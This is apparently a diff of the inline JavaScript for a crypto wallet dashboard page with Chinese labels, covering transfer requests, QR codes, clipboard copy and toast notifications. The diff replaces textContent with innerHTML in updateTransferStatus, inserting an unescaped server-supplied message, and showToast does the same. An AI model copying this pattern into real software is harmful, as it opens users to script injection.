+                    amount: amount
+                })
+            });
+
+            const data = await response.json();
+            
+            if (data.error) {
+                updateTransferStatus('danger', data.error);
+                document.getElementById('confirmTransfer').disabled = false;
+                return;
+            }
+
+            updateTransferStatus('info', '交易已發送，等待確認...');
+        } catch (error) {
+            console.error('轉帳失敗:', error);
+            updateTransferStatus('danger', '轉帳失敗');
+            document.getElementById('confirmTransfer').disabled = false;
+        }
+    }
+
+    function updateTransferStatus(type, message) {
+        const statusDiv = document.getElementById('transferStatus');
+        statusDiv.className = `alert alert-${type}`;
+        statusDiv.innerHTML = `<i class="fas fa-info-circle me-1"></i>${message}`;
+        statusDiv.style.display = 'block';
+    }
+
+    // QR碼功能
+    function initializeQRCode() {
+        try {
+            const qrContainer = document.getElementById('qrCode');
+            qrContainer.innerHTML = ''; // 清空容器
+            
+            new QRCode(qrContainer, {
+                text: QR_CODE_URL,
+                width: 256,
+                height: 256,
+                colorDark: "#000000",
+                colorLight: "#ffffff",
+                correctLevel: QRCode.CorrectLevel.H
+            });
+        } catch (error) {
+            console.error('生成QR碼失敗:', error);
+            document.getElementById('qrCode').innerHTML = `
+                <div class="alert alert-danger">
+                    <i class="fas fa-exclamation-circle me-1"></i>QR碼生成失敗
+                </div>`;
+        }
+    }
+
+    // 複製功能
+    function copyAddress(elementId) {
+        const text = document.getElementById(elementId).textContent;
+        copyToClipboard(text);
+    }
+
+    function copyToClipboard(text) {
+        navigator.clipboard.writeText(text)
+            .then(() => {
+                showToast('success', '已複製到剪貼板');
+            })
+            .catch(() => {
+                showToast('error', '複製失敗');
+            });
+    }
+
+    // 下載QR碼
+    function downloadQrCode() {
+        const canvas = document.querySelector('#qrCode canvas');
+        if (!canvas) {
+            showToast('error', 'QR碼尚未生成');
+            return;
+        }
+        
+        try {
+            const link = document.createElement('a');
+            link.download = 'qrcode.png';
+            link.href = canvas.toDataURL('image/png');
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        } catch (error) {
+            console.error('下載QR碼失敗:', error);
+            showToast('error', '下載QR碼失敗');
+        }
+    }
+
+    // Toast 通知
+    function showToast(type, message) {
+        const toastContainer = document.querySelector('.toast-container');
+        const toast = document.createElement('div');
+        toast.className = `toast align-items-center text-white bg-${type} border-0`;
+        toast.setAttribute('role', 'alert');
+        toast.setAttribute('aria-live', 'assertive');
+        toast.setAttribute('aria-atomic', 'true');
+
+        toast.innerHTML = `
+            <div class="d-flex">
+                <div class="toast-body">
+                    <i class="fas fa-${type === 'success' ? 'check-circle' : 
+                                     type === 'error' ? 'exclamation-circle' : 
+                                     type === 'warning' ? 'exclamation-triangle' : 
+                                     'info-circle'} me-1"></i>
+                    ${message}
+                </div>
+                <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
             </div>
         `;
-        walletList.appendChild(card);
-    });
-}
 
-async function removeWallet(address) {
-    try {
-        const response = await fetch(`${API_BASE_URL}/manual-wallets/${address}`, {
-            method: 'DELETE'
+        toastContainer.appendChild(toast);
+        const bsToast = new bootstrap.Toast(toast, {
+            animation: true,
+            autohide: true,
+            delay: 3000
         });
-        const data = await response.json();
-        
-        if (data.error) {
-            showToast('error', data.error);
-            return;
+        bsToast.show();
+
+        toast.addEventListener('hidden.bs.toast', function () {
+            toast.remove();
+        });
+    }
+
+    // 自動刷新數據
+    setInterval(refreshData, 30000); // 每30秒刷新一次
+
+    function refreshData() {
+        const activePage = document.querySelector('.page.active').id;
+        if (activePage === 'dashboard') {
+            refreshDashboard();
+        } else if (activePage === 'wallets') {
+            refreshWallets();
         }
-        
-        showToast('success', '錢包已刪除');
-        refreshWallets();
-    } catch (error) {
-        console.error('刪除錢包失敗:', error);
-        showToast('error', '刪除錢包失敗');
     }
-}
-
-// 轉帳功能
-function initiateTransfer(address) {
-    document.getElementById('transferFromAddress').value = address;
-    document.getElementById('transferAmount').value = '';
-    document.getElementById('transferStatus').style.display = 'none';
-    document.getElementById('confirmTransfer').disabled = false;
-    transferModal.show();
-}
-
-async function confirmTransfer() {
-    const fromAddress = document.getElementById('transferFromAddress').value;
-    const amount = document.getElementById('transferAmount').value;
-
-    if (!amount || parseFloat(amount) <= 0) {
-        showToast('error', '請輸入有效的轉帳金額');
-        return;
-    }
-
-    try {
-        document.getElementById('confirmTransfer').disabled = true;
-        updateTransferStatus('info', '正在發送交易...');
-
-        const response = await fetch(`${API_BASE_URL}/transfer`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                fromAddress: fromAddress,
-                amount: amount
-            })
-        });
-
-        const data = await response.json();
-        
-        if (data.error) {
-            updateTransferStatus('danger', data.error);
-            document.getElementById('confirmTransfer').disabled = false;
-            return;
-        }
-
-        updateTransferStatus('info', '交易已發送，等待確認...');
-    } catch (error) {
-        console.error('轉帳失敗:', error);
-        updateTransferStatus('danger', '轉帳失敗');
-        document.getElementById('confirmTransfer').disabled = false;
-    }
-}
-
-function updateTransferStatus(type, message) {
-    const statusDiv = document.getElementById('transferStatus');
-    statusDiv.className = `alert alert-${type}`;
-    statusDiv.textContent = message;
-    statusDiv.style.display = 'block';
-}
-
-// QR碼功能
-function initializeQRCode() {
-    try {
-        const qrContainer = document.getElementById('qrCode');
-        qrContainer.innerHTML = ''; // 清空容器
-        
-        new QRCode(qrContainer, {
-            text: QR_CODE_URL,
-            width: 256,
-            height: 256,
-            colorDark: "#000000",
-            colorLight: "#ffffff",
-            correctLevel: QRCode.CorrectLevel.H
-        });
-    } catch (error) {
-        console.error('生成QR碼失敗:', error);
-        document.getElementById('qrCode').innerHTML = '<div class="alert alert-danger">QR碼生成失敗</div>';
-    }
-}
-
-// 複製功能
-function copyAddress(elementId) {
-    const text = document.getElementById(elementId).textContent;
-    copyToClipboard(text);
-}
-
-function copyToClipboard(text) {
-    navigator.clipboard.writeText(text)
-        .then(() => {
-            showToast('success', '已複製到剪貼板');
-        })
-        .catch(() => {
-            showToast('error', '複製失敗');
-        });
-}
-
-// 下載QR碼
-function downloadQrCode() {
-    const canvas = document.querySelector('#qrCode canvas');
-    if (!canvas) {
-        showToast('error', 'QR碼尚未生成');
-        return;
-    }
-    
-    try {
-        const link = document.createElement('a');
-        link.download = 'qrcode.png';
-        link.href = canvas.toDataURL('image/png');
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-    } catch (error) {
-        console.error('下載QR碼失敗:', error);
-        showToast('error', '下載QR碼失敗');
-    }
-}
-
-// Toast 通知
-function showToast(type, message) {
-    const toastContainer = document.querySelector('.toast-container');
-    const toast = document.createElement('div');
-    toast.className = `toast align-items-center text-white bg-${type} border-0`;
-    toast.setAttribute('role', 'alert');
-    toast.setAttribute('aria-live', 'assertive');
-    toast.setAttribute('aria-atomic', 'true');
-
-    toast.innerHTML = `
-        <div class="d-flex">
-            <div class="toast-body">
-                ${message}
-            </div>
-            <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
-        </div>
-    `;
-
-    toastContainer.appendChild(toast);
-    const bsToast = new bootstrap.Toast(toast);
-    bsToast.show();
-
-    toast.addEventListener('hidden.bs.toast', function () {
-        toast.remove();
-    });
-}
-
-// 自動刷新數據
-setInterval(refreshData, 30000); // 每30秒刷新一次
-
-function refreshData() {
-    const activePage = document.querySelector('.page.active').id;
-    if (activePage === 'dashboard') {
-        refreshDashboard();
-    } else if (activePage === 'wallets') {
-        refreshWallets();
-    }
-}
-</script>
+    </script>
 </body>
 </html>
